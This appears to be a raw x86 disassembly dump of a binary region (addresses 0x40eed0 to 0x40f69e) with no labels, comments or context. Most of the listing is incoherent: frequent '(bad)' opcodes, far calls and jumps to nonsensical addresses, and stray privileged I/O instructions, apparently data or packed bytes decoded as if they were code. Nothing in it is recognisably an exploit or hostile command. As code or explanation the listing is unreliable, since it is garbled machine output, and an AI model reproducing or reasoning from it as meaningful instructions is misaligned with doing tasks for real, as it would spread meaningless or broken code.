  40eed0:	add    BYTE PTR [eax],al
  40eed2:	or     eax,0xc2ffffa9
  40eed7:	and    eax,0x8eff00ff
  40eedc:	outs   dx,BYTE PTR ds:[esi]
  40eedd:	stos   DWORD PTR es:[edi],eax
  40eede:	jmp    FWORD PTR [ebx]
  40eee0:	cmp    edi,0xffffff8a
  40eee3:	xchg   edi,edi
  40eee5:	add    bl,cl
  40eee7:	sar    edi,cl
  40eee9:	(bad)  
  40eeea:	jmp    FWORD PTR [ebp+0x6dcc72c2]
  40eef0:	add    BYTE PTR [ecx+0xffe95f],cl
  40eef6:	out    0xa1,al
  40eef8:	(bad)  
  40eef9:	(bad)  
  40eefa:	inc    DWORD PTR [edi+edi*1-0x79]
  40eefe:	sbb    DWORD PTR ds:0x710d00ff,0xffffffff
  40ef05:	push   esp
  40ef07:	add    edi,edi
  40ef09:	(bad)  
  40ef0a:	inc    DWORD PTR [edi+edi*4]
  40ef0d:	rol    DWORD PTR [eax],0xfc
  40ef10:	add    bh,bh
  40ef12:	inc    DWORD PTR [edx]
  40ef14:	add    BYTE PTR [ecx-0x7c33b36d],cl
  40ef1a:	add    BYTE PTR [ebx-0x38],bl
  40ef1d:	mov    bh,0xff
  40ef1f:	mov    al,BYTE PTR [eax]
  40ef21:	(bad)  
  40ef22:	mov    ebx,0xf389ff1e
  40ef27:	adc    edi,edi
  40ef29:	cmp    edi,0x3d
  40ef2c:	mov    ebp,0xff47ffab
  40ef31:	(bad)  
  40ef32:	fsub   QWORD PTR [ebp+0x59f6ffff]
  40ef38:	add    BYTE PTR [eax],al
  40ef3a:	add    bh,bl
  40ef3c:	jle    0x40eecf
  40ef3e:	jmp    DWORD PTR ds:0x178bffff
  40ef44:	(bad)  
  40ef45:	call   FWORD PTR [esp+ebp*1-0x2e010000]
  40ef4c:	mov    edx,0xffa6ffd8
  40ef51:	add    BYTE PTR [edi+0x23],ch
  40ef54:	dec    esp
  40ef56:	mov    edi,0xccffff42
  40ef5b:	fucomp st(5)
  40ef5d:	cmp    al,0xff
  40ef5f:	and    eax,0x4e7d0000
  40ef64:	(bad)  
  40ef65:	dec    DWORD PTR [ebx-0x38]
  40ef68:	cmp    edi,0xffffffff
  40ef6b:	dec    edx
  40ef6c:	pushf  
  40ef6d:	xchg   bh,bh
  40ef6f:	outs   dx,BYTE PTR ds:[esi]
  40ef70:	(bad)  
  40ef71:	call   FWORD PTR [ecx]
  40ef73:	jnp    0x40ef74
  40ef75:	call   FWORD PTR [esi-0x76ff33dc]
  40ef7b:	hlt    
  40ef7c:	lds    edi,FWORD PTR [edi]
  40ef7e:	add    BYTE PTR [ecx-0x7d],al
  40ef81:	jmp    FWORD PTR [ebp+0x1f]
  40ef84:	dec    esp
  40ef86:	pop    ds
  40ef87:	call   0xb0f5:0x96890000
  40ef8e:	add    al,dh
  40ef90:	inc    DWORD PTR [eax]
  40ef92:	xchg   ebx,eax
  40ef93:	das    
  40ef94:	inc    DWORD PTR [ebx-0x330074c3]
  40ef9a:	push   edx
  40ef9c:	mov    eax,0xff45ff4d
  40efa1:	call   DWORD PTR [ebx-0x74]
  40efa4:	inc    DWORD PTR [eax]
  40efa6:	add    DWORD PTR [eax-0x1f007c01],edi
  40efac:	call   DWORD PTR [eax-0x7d]
  40efaf:	mov    ch,0xff
  40efb1:	add    BYTE PTR [ecx],cl
  40efb3:	inc    esi
  40efb4:	cmp    edi,0xffffff89
  40efb7:	add    BYTE PTR ds:[ebx-0x27080100],al
  40efbe:	add    BYTE PTR [edx],bl
  40efc0:	add    BYTE PTR [eax],al
  40efc2:	mov    esp,DWORD PTR [edi+0x0]
  40efc5:	jmp    FWORD PTR [edx]
  40efc7:	mov    eax,ds:0x3700ff00
  40efcc:	adc    DWORD PTR [ebp-0x767c2b01],esi
  40efd2:	jge    0x40f003
  40efd4:	inc    DWORD PTR [eax]
  40efd6:	sbb    ecx,DWORD PTR [eax-0x1]
  40efd9:	(bad)  
  40efda:	jmp    FWORD PTR [ebx-0xdffd05f]
  40efe0:	(bad)  
  40efe1:	jmp    esp
  40efe3:	test   al,0xff
  40efe5:	mov    DWORD PTR [ecx],edx
  40efe7:	je     0x40efe8
  40efe9:	add    DWORD PTR [ebx-0x71555e],0xffffffb8
  40eff0:	cmp    edi,0xffffffa2
  40eff3:	inc    ebx
  40eff4:	add    bh,bh
  40eff6:	dec    esp
  40eff7:	and    DWORD PTR [eax],eax
  40eff9:	add    DWORD PTR [eax],0xffffffc0
  40effc:	or     edx,DWORD PTR [edi+edi*8]
  40efff:	loop   0x40f000
  40f001:	add    ch,dh
  40f003:	xchg   edx,eax
  40f004:	inc    DWORD PTR [eax]
  40f006:	cld    
  40f007:	inc    ebp
  40f008:	(bad)  
  40f009:	inc    DWORD PTR [ebx-0x7ca82c7d]
  40f00f:	aas    
  40f010:	int3   
  40f011:	sbb    ebp,0xffffffc7
  40f014:	inc    DWORD PTR [eax]
  40f016:	xor    DWORD PTR [ebx],ecx
  40f018:	mov    DWORD PTR [ebx-0x24735f01],eax
  40f01e:	add    BYTE PTR [eax],ch
  40f020:	add    bh,bh
  40f022:	cld    
  40f023:	sbb    DWORD PTR [eax],eax
  40f025:	add    BYTE PTR [ebx+edx*2+0x0],dl
  40f029:	inc    DWORD PTR [eax]
  40f02b:	retf   
  40f02c:	std    
  40f02d:	mov    al,0xff
  40f02f:	icebp  
  40f030:	(bad)  
  40f031:	(bad)  
  40f032:	jg     0x40f04d
  40f034:	(bad)  
  40f035:	jmp    DWORD PTR [ecx+esi*4]
  40f038:	inc    DWORD PTR [eax]
  40f03a:	jmp    DWORD PTR [ecx]
  40f03c:	adc    al,0xe3
  40f03e:	dec    DWORD PTR [eax-0x1]
  40f041:	jmp    esi
  40f043:	pop    esi
  40f044:	add    bh,bh
  40f046:	xor    BYTE PTR [edi+edi*8-0x7d],ch
  40f04a:	add    BYTE PTR [edx+0x39],al
  40f04d:	aam    0x0
  40f04f:	jge    0x40f051
  40f051:	or     DWORD PTR [ecx-0x7800000f],0xfffffff6
  40f058:	add    BYTE PTR [ebx-0x1e46357d],al
  40f05e:	sub    DWORD PTR [edx-0xd3c0000],0xffffffff
  40f065:	(bad)  
  40f066:	jge    0x40f052
  40f068:	mov    DWORD PTR [ebx+0x4eef0389],eax
  40f06e:	push   DWORD PTR [esi-0x77]
  40f071:	(bad)  
  40f072:	ds push ds
  40f074:	cmp    edi,0xffffffc6
  40f077:	jmp    0x5bfa:0x61ff83cc
  40f07e:	call   DWORD PTR [edx-0x1]
  40f081:	cmp    DWORD PTR [esi-0x53],0x0
  40f085:	(bad)  
  40f086:	(bad)  
  40f087:	jle    0x40f089
  40f089:	dec    esp
  40f08b:	sbb    dh,BYTE PTR [esi-0xeb0076]
  40f091:	add    BYTE PTR [ebx-0x110000ba],ch
  40f097:	or     eax,0x148983cc
  40f09c:	jle    0x40f09f
  40f09e:	int3   
  40f09f:	ret    
  40f0a0:	or     esp,0xffffff9c
  40f0a3:	sbb    al,BYTE PTR [eax]
  40f0a5:	call   DWORD PTR [edx-0x760076a8]
  40f0ab:	push   cs
  40f0ac:	scas   eax,DWORD PTR es:[edi]
  40f0ad:	dec    edx
  40f0ae:	and    DWORD PTR [edx-0x1],0xffffff83
  40f0b2:	fdivp  st(4),st
  40f0b4:	(bad)  
  40f0b5:	inc    ecx
  40f0b7:	dec    ebp
  40f0b8:	(bad)  
  40f0b9:	inc    DWORD PTR [ebx+0x843b68]
  40f0bf:	mov    eax,DWORD PTR [ebx-0x7cbdab01]
  40f0c5:	inc    DWORD PTR [edi-0xffff7f]
  40f0cb:	pop    ss
  40f0cc:	out    dx,eax
  40f0cd:	out    dx,al
  40f0ce:	dec    DWORD PTR [edx-0x34]
  40f0d1:	add    BYTE PTR [edx+0x4d],bh
  40f0d4:	(bad)  
  40f0d5:	(bad)  
  40f0d6:	mov    ebx,0xffffffd1
  40f0db:	(bad)
  40f0df:	jno    0x40f0e0
  40f0e1:	add    BYTE PTR [ebp-0x6f],ah
  40f0e4:	inc    DWORD PTR [eax]
  40f0e6:	test   BYTE PTR [edx-0x77],ah
  40f0e9:	add    bh,bh
  40f0eb:	mov    al,ds:0x6883c0a3
  40f0f0:	(bad)  
  40f0f1:	(bad)  
  40f0f2:	fnstcw WORD PTR [edi-0x1]
  40f0f5:	add    BYTE PTR [edx-0xff0087],dh
  40f0fb:	add    al,0xbf
  40f0fd:	ud0    ebp,edx
  40f100:	inc    DWORD PTR [eax]
  40f102:	xlat   BYTE PTR ds:[ebx]
  40f103:	je     0x40f104
  40f105:	call   DWORD PTR [eax-0x20]
  40f108:	inc    DWORD PTR [eax]
  40f10a:	mov    DWORD PTR ds:0xd2007eed,esi
  40f110:	cmp    edi,0xffffffff
  40f113:	pop    ss
  40f114:	(bad)  
  40f115:	dec    DWORD PTR [esi+esi*1]
  40f118:	dec    esp
  40f11a:	jmp    DWORD PTR [ebx-0x8]
  40f11d:	in     eax,dx
  40f11e:	add    al,dh
  40f120:	add    BYTE PTR [eax],al
  40f122:	push   esp
  40f123:	fs dec esp
  40f126:	stos   BYTE PTR es:[edi],al
  40f127:	test   bh,bh
  40f129:	add    DWORD PTR [eax],0xffffffe2
  40f12c:	nop
  40f12d:	mov    al,0xff
  40f12f:	test   bh,bh
  40f131:	add    ah,dl
  40f133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f134:	inc    DWORD PTR [eax]
  40f136:	or     bh,ah
  40f138:	(bad)  
  40f139:	(bad)  
  40f13a:	jmp    FWORD PTR [eax]
  40f13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f13d:	lock add BYTE PTR [ebx-0x22ebff01],ch
  40f144:	inc    DWORD PTR [ebx-0xd5c6]
  40f14a:	call   FWORD PTR [ebx+0x22]
  40f14d:	push   es
  40f14e:	add    BYTE PTR [ebp+0x5b083cc],al
  40f154:	inc    DWORD PTR [ebx-0x76ffcba6]
  40f15a:	int3   
  40f15b:	into   
  40f15c:	xchg   DWORD PTR [ecx],ebx
  40f15e:	jmp    DWORD PTR [ecx+0x3ff1ffff]
  40f164:	int3   
  40f165:	add    BYTE PTR [esi+ebx*2],al
  40f168:	add    bh,bh
  40f16a:	push   DWORD PTR [eax+ecx*2+0x51ff90]
  40f171:	add    BYTE PTR [edx-0x19330095],dh
  40f177:	iret   
  40f178:	(bad)  
  40f179:	inc    DWORD PTR [ebx-0x2dcae9]
  40f17f:	and    edi,edi
  40f181:	call   DWORD PTR [edx]
  40f183:	aas    
  40f184:	int3   
  40f185:	inc    DWORD PTR [ebp-0xff0079]
  40f18b:	adc    DWORD PTR gs:[ebx],edi
  40f18e:	add    BYTE PTR [edi+0x35bffff],dl
  40f194:	add    DWORD PTR [eax],0x6d
  40f197:	sub    DWORD PTR [ebx-0x189c7601],eax
  40f19d:	stos   BYTE PTR es:[edi],al
  40f19e:	add    BYTE PTR [eax],dh
  40f1a0:	mov    DWORD PTR [eax],eax
  40f1a2:	ss xchg edx,eax
  40f1a4:	cmp    edi,0xffffff98
  40f1a7:	push   esi
  40f1a8:	(bad)  
  40f1a9:	inc    DWORD PTR [ebx+0x18e22e]
  40f1af:	inc    esp
  40f1b0:	(bad)  
  40f1b1:	call   FWORD PTR [eax]
  40f1b3:	out    0x0,eax
  40f1b5:	add    BYTE PTR [eax-0x7c94],ch
  40f1bb:	ja     0x40f1c6
  40f1bd:	in     eax,dx
  40f1be:	call   FWORD PTR [edi]
  40f1c0:	cmp    edi,0x3a
  40f1c3:	mov    cl,0x0
  40f1c5:	jmp    DWORD PTR [edx-0x8]
  40f1c8:	int3   
  40f1c9:	inc    DWORD PTR [ebx-0xad39c0]
  40f1cf:	pop    ebx
  40f1d0:	add    BYTE PTR [eax],al
  40f1d2:	mov    eax,0x6acc003b
  40f1d7:	repnz (bad) 
  40f1d9:	inc    DWORD PTR [eax]
  40f1db:	and    eax,0x8d0022e0
  40f1e0:	add    BYTE PTR [ecx-0x7cffd36d],cl
  40f1e6:	jnp    0x40f21a
  40f1e8:	(bad)  
  40f1e9:	inc    DWORD PTR [eax]
  40f1eb:	icebp  
  40f1ec:	xchg   BYTE PTR [ebx],cl
  40f1ee:	call   FWORD PTR [esi-0x7d]
  40f1f1:	adc    DWORD PTR [edx-0x6600ff5d],0xffffffe5
  40f1f8:	inc    DWORD PTR [ebx-0x7c057e00]
  40f1fe:	add    BYTE PTR [edi-0x77],dl
  40f201:	add    BYTE PTR ds:0xa7ff83dd,bl
  40f207:	mov    bl,0xff
  40f209:	inc    DWORD PTR [ebx-0x769fe47b]
  40f20f:	cli    
  40f210:	inc    DWORD PTR [eax]
  40f212:	adc    DWORD PTR [edx+0x132bff00],ebp
  40f218:	(bad)  
  40f219:	inc    DWORD PTR [ebx+0x791cb5]
  40f21f:	enter  0xffff,0x9b
  40f223:	pop    ss
  40f224:	mov    edi,edi
  40f226:	les    ecx,FWORD PTR [ebp-0x1]
  40f229:	add    BYTE PTR [eax],al
  40f22b:	les    esi,FWORD PTR [edx-0xc]
  40f22e:	or     esi,0x0
  40f231:	add    DWORD PTR [edi],0xffffff9a
  40f234:	cmp    edi,0xa
  40f237:	inc    eax
  40f238:	(bad)  
  40f239:	(bad)  
  40f23a:	call   DWORD PTR [eax-0x6a333391]
  40f240:	int3   
  40f241:	mov    DWORD PTR [ecx+ebp*2-0x34e6ff7d],edx
  40f248:	(bad)  
  40f249:	inc    DWORD PTR [eax]
  40f24b:	cmp    ah,cl
  40f24d:	je     0x40f24f
  40f24f:	jl     0x40f250
  40f251:	dec    DWORD PTR [ebp+0x26]
  40f254:	(bad)  
  40f255:	jmp    FWORD PTR [ebx-0x7600e5]
  40f25b:	xor    edi,ebx
  40f25d:	push   edi
  40f25e:	(bad)  
  40f25f:	fadd   QWORD PTR [ebx-0x9d9300]
  40f265:	add    dh,ch
  40f267:	mov    edx,0xb6ffff89
  40f26c:	clc    
  40f26d:	aad    0xff
  40f26f:	test   BYTE PTR [eax],0x0
  40f272:	mov    DWORD PTR [ecx+ecx*4],ebx
  40f275:	jmp    FWORD PTR [esi+ebp*1+0x0]
  40f279:	(bad)  
  40f27a:	jmp    DWORD PTR [eax]
  40f27c:	leave  
  40f27d:	ins    BYTE PTR es:[edi],dx
  40f27e:	jmp    FWORD PTR [edi-0x1]
  40f281:	add    BYTE PTR [esi-0x5b],bh
  40f284:	dec    esp
  40f286:	iret   
  40f287:	xor    DWORD PTR [eax],eax
  40f289:	add    DWORD PTR [ebx+0xbdaef3],0x5f
  40f290:	(bad)  
  40f291:	(bad)  
  40f292:	fsincos 
  40f294:	inc    DWORD PTR [ebx-0x6d35]
  40f29a:	(bad)  
  40f29b:	call   0xde40536a
  40f2a0:	add    BYTE PTR [ebx-0xbf28],al
  40f2a6:	sahf   
  40f2a7:	or     DWORD PTR [ebx+0x54f08900],eax
  40f2ad:	mov    al,ds:0x83ff90ff
  40f2b2:	adc    ah,BYTE PTR [edi]
  40f2b4:	add    DWORD PTR [eax],0x45
  40f2b7:	lods   al,BYTE PTR ds:[esi]
  40f2b8:	(bad)  
  40f2b9:	inc    DWORD PTR [ebx+0x77d201]
  40f2bf:	and    al,0xff
  40f2c1:	(bad)  
  40f2c2:	fnstcw WORD PTR [ebx]
  40f2c4:	int3   
  40f2c5:	inc    DWORD PTR [eax+0x8300bb]
  40f2cb:	aas    
  40f2cc:	cmp    edx,DWORD PTR [ecx-0x1]
  40f2cf:	out    dx,al
  40f2d0:	inc    DWORD PTR [eax]
  40f2d2:	xchg   esp,eax
  40f2d3:	je     0x40f2d4
  40f2d5:	jmp    FWORD PTR [edx+0x30]
  40f2d8:	add    DWORD PTR [ebx-0x4bbea601],0x0
  40f2df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2e0:	or     esp,0x6a
  40f2e3:	in     eax,0xff
  40f2e5:	call   DWORD PTR [esi-0x3300ff96]
  40f2eb:	sar    BYTE PTR [bx+di-0x1],cl
  40f2ef:	iret   
  40f2f0:	mov    DWORD PTR [ebx-0xbe72],eax
  40f2f6:	add    DWORD PTR [ebx-0x1],esi
  40f2f9:	mov    DWORD PTR [ecx-0x562b38],ecx
  40f2ff:	idiv   edi
  40f301:	inc    DWORD PTR [esi+0x5b830096]
  40f307:	je     0x40f308
  40f309:	inc    DWORD PTR [eax]
  40f30b:	jl     0x40f36c
  40f30d:	outs   dx,DWORD PTR ds:[esi]
  40f30e:	(bad)  
  40f30f:	cli    
  40f310:	add    bh,bh
  40f312:	aad    0xf2
  40f314:	(bad)  
  40f315:	jmp    FWORD PTR [edi]
  40f317:	aad    0x89
  40f319:	add    bh,bh
  40f31b:	ins    BYTE PTR es:[edi],dx
  40f31c:	stc    
  40f31d:	test   DWORD PTR [eax],0x9
  40f323:	jno    0x40f324
  40f325:	add    BYTE PTR [edi],cl
  40f327:	mov    ecx,0x6c00ffff
  40f32c:	push   edx
  40f32d:	mov    DWORD PTR [eax],0xc2ffff18
  40f333:	mov    al,ds:0xcd62ff00
  40f338:	or     DWORD PTR [ecx-0x23e91d01],0xffffffff
  40f33f:	add    al,BYTE PTR [eax]
  40f341:	add    BYTE PTR [edx+esi*8-0x60dd7700],bh
  40f348:	(bad)  
  40f349:	(bad)  
  40f34a:	call   FWORD PTR [edi]
  40f34c:	pop    ebx
  40f34d:	out    0x89,eax
  40f34f:	int3   
  40f350:	(bad)  
  40f351:	(bad)  
  40f352:	stc    
  40f353:	adc    edi,edi
  40f355:	add    BYTE PTR [eax+0x3],ah
  40f358:	inc    DWORD PTR [eax]
  40f35a:	or     ebp,0xa
  40f35d:	test   DWORD PTR [ecx-0x90000f0],ecx
  40f363:	inc    ecx
  40f364:	int3   
  40f365:	(bad)  
  40f366:	jmp    0x10dbf79
  40f36b:	push   cs
  40f36c:	(bad)  
  40f36d:	mov    ecx,0xff07ff
  40f372:	fdivr  DWORD PTR [edi-0x1]
  40f375:	adc    DWORD PTR [ecx-0x33007c7e],0xfffffff2
  40f37c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f37d:	sar    bh,0x6f
  40f380:	add    BYTE PTR [eax],al
  40f382:	cmp    edx,DWORD PTR [ecx-0x1]
  40f385:	add    DWORD PTR [edx],0x7f
  40f388:	add    BYTE PTR [eax],al
  40f38a:	add    bl,bh
  40f38c:	loop   0x40f365
  40f38e:	call   DWORD PTR [eax-0x1]
  40f391:	call   FWORD PTR [esi-0x1833ff85]
  40f397:	mov    esi,0x9600ff89
  40f39c:	aam    0x14
  40f39e:	add    BYTE PTR [ebx+0x70f683ff],al
  40f3a4:	or     DWORD PTR [ecx-0xcc35],0xffffffff
  40f3ab:	stos   BYTE PTR es:[edi],al
  40f3ac:	xchg   edi,edx
  40f3ae:	jmp    DWORD PTR [esi]
  40f3b0:	inc    DWORD PTR [eax]
  40f3b2:	jge    0x40f406
  40f3b4:	int3   
  40f3b5:	add    BYTE PTR [ecx+eax*2],al
  40f3b8:	(bad)  
  40f3b9:	inc    DWORD PTR [eax]
  40f3bb:	icebp  
  40f3bc:	jle    0x40f3a1
  40f3be:	add    BYTE PTR [edi],bl
  40f3c0:	(bad)  
  40f3c1:	call   FWORD PTR [ebx]
  40f3c3:	mov    ds:0x42e8ff83,eax
  40f3c8:	int3   
  40f3c9:	(bad)  
  40f3ca:	jmp    DWORD PTR [ecx+0x2fffac26]
  40f3d0:	(bad)  
  40f3d1:	call   FWORD PTR [edx-0x750000b2]
  40f3d7:	clc    
  40f3d8:	add    BYTE PTR [eax],al
  40f3da:	add    BYTE PTR [ecx],bl
  40f3dc:	xchg   edi,eax
  40f3dd:	mov    bh,0xff
  40f3df:	(bad)  
  40f3e0:	inc    DWORD PTR [eax]
  40f3e2:	and    al,0x68
  40f3e4:	int3   
  40f3e5:	(bad)  
  40f3e6:	cmp    BYTE PTR [eax],dh
  40f3e8:	add    BYTE PTR [ecx+0x4016b400],cl
  40f3ee:	add    dh,dl
  40f3f0:	inc    DWORD PTR [eax]
  40f3f2:	xchg   ebp,eax
  40f3f3:	scas   al,BYTE PTR es:[edi]
  40f3f4:	inc    DWORD PTR [eax]
  40f3f6:	mov    ebx,0x8383ff74
  40f3fb:	cmp    ch,0x59
  40f3fe:	int3   
  40f3ff:	ins    DWORD PTR es:[edi],dx
  40f400:	(bad)  
  40f401:	dec    DWORD PTR [edi]
  40f403:	adc    al,0xcc
  40f405:	add    BYTE PTR [ebp-0x330090],dh
  40f40b:	mov    dh,0xf8
  40f40d:	dec    edi
  40f40e:	dec    ecx
  40f410:	add    BYTE PTR [eax],al
  40f412:	push   ebx
  40f413:	add    bh,bh
  40f415:	jmp    FWORD PTR [esi+0x54]
  40f418:	add    BYTE PTR [ecx+0x2d9d5ff],cl
  40f41e:	inc    DWORD PTR [ebx-0x1]
  40f421:	inc    DWORD PTR [ecx]
  40f423:	xchg   edi,edi
  40f425:	add    BYTE PTR [edx-0x6],bl
  40f428:	add    BYTE PTR [ebx+0x3d01c9ff],al
  40f42e:	call   DWORD PTR [eax-0x6670100]
  40f434:	or     esp,0xffffffaa
  40f437:	test   bh,bh
  40f439:	(bad)  
  40f43a:	push   edx
  40f43c:	dec    eax
  40f43d:	dec    esp
  40f43e:	jmp    FWORD PTR [ecx]
  40f440:	add    bh,bh
  40f442:	sbb    eax,0xb80000c0
  40f447:	sar    bh,1
  40f449:	add    bh,bh
  40f44b:	mov    cl,0xdd
  40f44d:	or     edi,edi
  40f44f:	jecxz  0x40f451
  40f451:	call   FWORD PTR [ebx-0x5700ff5b]
  40f457:	add    DWORD PTR fs:[eax],0xffffffff
  40f45b:	div    BYTE PTR [ebp-0x7c520013]
  40f461:	add    dh,dl
  40f463:	or     edi,edi
  40f465:	inc    ebp
  40f467:	adc    eax,0x7dffffff
  40f46c:	sub    al,0xe8
  40f46e:	add    BYTE PTR [ecx],ah
  40f470:	(bad)  
  40f471:	jmp    DWORD PTR [ecx-0x280033ec]
  40f477:	outs   dx,DWORD PTR ds:[esi]
  40f478:	(bad)  
  40f479:	inc    DWORD PTR [ebx-0x76d22c7e]
  40f47f:	cli    
  40f480:	(bad)  
  40f481:	call   DWORD PTR [esi]
  40f483:	xchg   edx,eax
  40f484:	(bad)  
  40f485:	(bad)  
  40f486:	mov    eax,0xffffccf1
  40f48b:	out    dx,eax
  40f48c:	repnz clc 
  40f48e:	add    BYTE PTR [ebx+eax*4-0x768bba7d],al
  40f495:	call   FWORD PTR ds:0xff8300fe
  40f49b:	mov    WORD PTR [esi-0x7c8c3371],cs
  40f4a1:	add    BYTE PTR [ebx],ch
  40f4a3:	mov    edx,0x11a60000
  40f4a8:	add    bh,bh
  40f4aa:	int3   
  40f4ab:	fdivp  st(2),st
  40f4ad:	cs (bad) 
  40f4af:	jp     0x40f4b1
  40f4b1:	inc    DWORD PTR [ebx+0x45]
  40f4b4:	inc    DWORD PTR [eax]
  40f4b6:	pop    ebp
  40f4b7:	rol    DWORD PTR [eax],1
  40f4b9:	(bad)  
  40f4ba:	call   DWORD PTR [ecx-0x4d]
  40f4bd:	mov    esp,0xff10ff
  40f4c2:	mov    ecx,0xf300ff0f
  40f4c7:	push   edi
  40f4c8:	add    BYTE PTR [ecx+0x68bb9aff],cl
  40f4ce:	add    BYTE PTR [ecx-0x58de0000],bh
  40f4d4:	add    BYTE PTR [eax],al
  40f4d6:	jnp    0x40f496
  40f4d8:	add    bh,bh
  40f4da:	add    BYTE PTR [edx-0x34],cl
  40f4dd:	fimul  DWORD PTR [ecx+0xa0083de]
  40f4e3:	imul   edi,edi,0xffffff89
  40f4e6:	out    0xa8,eax
  40f4e8:	add    bh,bh
  40f4ea:	adc    DWORD PTR [ebx+0x20ff8226],0x0
  40f4f1:	push   DWORD PTR [edi+esi*4+0x0]
  40f4f5:	dec    DWORD PTR [ecx]
  40f4f7:	test   al,0xff
  40f4f9:	add    BYTE PTR [eax],al
  40f4fb:	mov    esi,0x62831056
  40f500:	inc    DWORD PTR [eax]
  40f502:	pusha  
  40f503:	jle    0x40f505
  40f505:	jmp    FWORD PTR [esi+esi*8]
  40f508:	(bad)  
  40f509:	inc    DWORD PTR [eax]
  40f50b:	test   DWORD PTR [edi+0x5583d9],0xff212583
  40f515:	(bad)  
  40f516:	fld    QWORD PTR [edi+0x0]
  40f519:	cmp    edi,0x3c
  40f51c:	sahf   
  40f51d:	or     bh,bh
  40f51f:	and    BYTE PTR [eax],al
  40f521:	jmp    DWORD PTR [edi+eiz*4-0x1]
  40f525:	add    BYTE PTR [ebx-0x5e],dl
  40f528:	add    DWORD PTR [eax],0xffffffff
  40f52b:	repnz test eax,0x8338ffb5
  40f531:	and    DWORD PTR [edi+0x1cccff8c],0xffffffd3
  40f538:	cmp    edi,0xffffffff
  40f53b:	dec    ecx
  40f53c:	das    
  40f53d:	or     edi,edi
  40f53f:	sar    bh,cl
  40f541:	(bad)  
  40f542:	jl     0x40f505
  40f544:	add    bh,bh
  40f546:	mov    al,0xd5
  40f548:	inc    DWORD PTR [eax]
  40f54a:	inc    DWORD PTR [edx-0x15ffb9f8]
  40f550:	add    bh,bh
  40f552:	jl     0x40f586
  40f554:	(bad)  
  40f555:	inc    DWORD PTR [eax]
  40f557:	inc    BYTE PTR [ebx+0x5e2083ff]
  40f55d:	sub    DWORD PTR [ebx-0xb00002d],eax
  40f563:	adc    eax,0xad9800ff
  40f568:	cmp    edi,0xffffff83
  40f56b:	mov    ds:0xc78323f9,al
  40f570:	(bad)  
  40f571:	call   DWORD PTR [ecx-0x1c]
  40f574:	add    BYTE PTR [ebx-0xff28a1],al
  40f57a:	add    BYTE PTR [ebp+0x63005fe7],ah
  40f580:	(bad)  
  40f581:	jmp    FWORD PTR [edx+0x2100003d]
  40f587:	pop    DWORD PTR [eax]
  40f589:	inc    DWORD PTR [eax]
  40f58b:	lahf   
  40f58c:	pop    ecx
  40f58d:	clc    
  40f58e:	jmp    esi
  40f590:	mov    edi,edi
  40f592:	sti    
  40f593:	cmp    bh,0x0
  40f596:	push   esp
  40f597:	ss add bh,bh
  40f59a:	add    bl,dl
  40f59c:	push   ss
  40f59d:	cli    
  40f59e:	add    BYTE PTR [eax+eax*1-0x7d],dh
  40f5a2:	test   edx,esi
  40f5a4:	add    bh,bh
  40f5a6:	(bad)  
  40f5a7:	pop    ebp
  40f5a8:	int3   
  40f5a9:	add    DWORD PTR [eax],0xfffffff1
  40f5ac:	cmp    BYTE PTR [eax-0x1],bl
  40f5af:	inc    esp
  40f5b0:	int3   
  40f5b1:	add    BYTE PTR [edi],bl
  40f5b3:	in     eax,dx
  40f5b4:	(bad)  
  40f5b5:	jmp    FWORD PTR [edx-0xff7631]
  40f5bb:	call   0xffff:0xb8836e2a
  40f5c2:	iret   
  40f5c3:	sub    bh,bh
  40f5c5:	int3   
  40f5c6:	jmp    0x40f55e
  40f5c8:	inc    DWORD PTR [eax]
  40f5ca:	add    BYTE PTR [esp+esi*1-0x47],al
  40f5ce:	add    BYTE PTR [ecx],ch
  40f5d0:	inc    DWORD PTR [eax]
  40f5d2:	idiv   DWORD PTR [esp+ecx*8-0x275901]
  40f5d9:	add    DWORD PTR [ebx+0xbdb515],0xffffffb8
  40f5e0:	dec    DWORD PTR [ecx-0x7c46c8]
  40f5e6:	outs   dx,BYTE PTR ds:[esi]
  40f5e7:	mov    edi,0x8300ff00
  40f5ec:	mov    ecx,0xc4fff3
  40f5f1:	(bad)  
  40f5f2:	jmp    0xa2caf57c
  40f5f7:	dec    ecx
  40f5f8:	add    BYTE PTR [ebx-0x7ca6d701],al
  40f5fe:	call   FWORD PTR [ebx+eax*4+0x0]
  40f602:	push   cs
  40f603:	mov    edi,0x4aeeff00
  40f608:	(bad)  
  40f609:	(bad)  
  40f60a:	dec    DWORD PTR ds:0x4eff74f8
  40f610:	cmp    edi,0xffffffa8
  40f613:	outs   dx,BYTE PTR ds:[esi]
  40f614:	add    BYTE PTR [ebx-0x76b558],al
  40f61a:	call   DWORD PTR [ebp+0x5683f83b]
  40f620:	dec    esp
  40f622:	mov    ah,0x90
  40f624:	inc    DWORD PTR [ebx-0xff0977]
  40f62a:	(bad)  
  40f62b:	lds    edx,FWORD PTR ds:[eax+0xff7800]
  40f632:	(bad)  [ebx]
  40f634:	add    bh,bh
  40f636:	js     0x40f5f7
  40f638:	add    bh,bh
  40f63a:	dec    DWORD PTR [eax+0x2e]
  40f63d:	arpl   di,di
  40f63f:	out    dx,al
  40f640:	add    bh,bh
  40f642:	mov    esi,0xf0008340
  40f647:	scas   al,BYTE PTR es:[edi]
  40f648:	(bad)  
  40f649:	(bad)  
  40f64a:	jmp    FWORD PTR [ebp+0x5200ab3c]
  40f650:	inc    DWORD PTR [eax]
  40f652:	cmc    
  40f653:	retf   0xffff
  40f656:	je     0x40f63e
  40f658:	dec    esp
  40f65a:	and    DWORD PTR [edx-0x39],0x48
  40f65e:	add    BYTE PTR [edi+edi*8-0x185b01],bl
  40f665:	push   DWORD PTR [ecx+0x35]
  40f668:	mov    DWORD PTR [ecx-0xddfd801],ecx
  40f66e:	call   FWORD PTR [ebx]
  40f670:	add    ah,cl
  40f672:	dec    ebx
  40f673:	inc    DWORD PTR gs:[ebx+0x890851]
  40f67a:	add    BYTE PTR [ebx],ah
  40f67c:	pop    esi
  40f67d:	mov    esi,0xffff32ff
  40f682:	adc    eax,0x16ffffc4
  40f687:	dec    edi
  40f688:	add    DWORD PTR [eax],0xffffff89
  40f68b:	ret    0x5cbf
  40f68e:	add    DWORD PTR ds:0x1c8200ff,0xffffffcc
  40f695:	add    BYTE PTR [edi-0x18],dl
  40f698:	inc    DWORD PTR [eax]
  40f69a:	add    BYTE PTR [eax+0x69],cl
  40f69d:	leave  
  40f69e:	call   DWORD PTR [edi+0x4b548900]
